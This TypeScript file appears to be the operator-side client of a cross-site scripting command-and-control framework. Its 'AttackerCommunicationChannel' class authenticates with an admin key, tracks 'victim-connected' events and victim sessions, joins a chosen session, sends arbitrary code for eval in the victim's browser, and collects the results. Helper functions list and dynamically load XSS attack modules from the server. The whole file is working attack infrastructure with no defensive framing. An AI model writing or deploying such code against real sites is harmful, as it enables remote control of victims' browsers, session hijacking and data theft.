import { CommunicationChannel } from './communication-channel.js';
import { SocketMessage, XSSModule } from '../types/index.js';

export class AttackerCommunicationChannel extends CommunicationChannel {
  private callbacks: Record<string, (data: any) => void> = {};
  public sessionsCallback?: (sessions: any[]) => void;

  constructor(serverUrl: string, adminKey: string) {
    super(serverUrl, undefined, adminKey);
  }

  protected onConnect(): void {
    super.onConnect();
    this.socket.emit('admin-connect', { adminKey: this.adminKey });
  }

  protected onMessage(message: SocketMessage): void {
    if (message.type === 'victim-connected') {
      (window as any).app?.$emit('change-state', 'victim-connected');
    } else if (message.type === 'eval-result' && 'id' in message && 'data' in message) {
      const callback = this.callbacks[message.id as string];
      if (callback) {
        callback(message.data);
        delete this.callbacks[message.id as string];
      }
    } else if (message.type === 'sessions' && 'sessions' in message) {
      if (this.sessionsCallback) {
        this.sessionsCallback(message.sessions as any[]);
      }
    }
  }

  public sendEval(code: string, callback: (data: any) => void): void {
    const id = this.randomId('eval');
    this.callbacks[id] = callback;
    
    this.send({
      type: 'eval',
      code,
      id
    });
  }

  public joinSession(sessionId: string): void {
    this.socket.emit('join-session', sessionId);
  }

  private randomId(prefix = ''): string {
    return prefix + Math.random().toString().slice(2);
  }
}

// Global functions for the Vue app
export async function checkAdminKey(adminKey: string): Promise<{ status: string }> {
  const headers = new Headers();
  headers.set('X-Admin-Key', adminKey);

  const response = await fetch('/check-admin-key', { headers });
  return await response.json();
}

export async function loadModules(): Promise<string[]> {
  try {
    const response = await fetch('/modules');
    return await response.json();
  } catch (error) {
    console.error('Failed to load modules:', error);
    return [];
  }
}

export async function loadModule(moduleName: string): Promise<XSSModule | null> {
  try {
    const moduleScript = await import(`/dist/modules/${moduleName}.js`);
    return moduleScript.default || null;
  } catch (error) {
    console.error(`Failed to load module ${moduleName}:`, error);
    return null;
  }
}

// Initialize global communication channel
let communicationChannel: AttackerCommunicationChannel | null = null;

export function initializeWebSocket(adminKey: string): AttackerCommunicationChannel {
  communicationChannel = new AttackerCommunicationChannel(window.location.origin, adminKey);
  return communicationChannel;
}

export function getCommunicationChannel(): AttackerCommunicationChannel | null {
  return communicationChannel;
}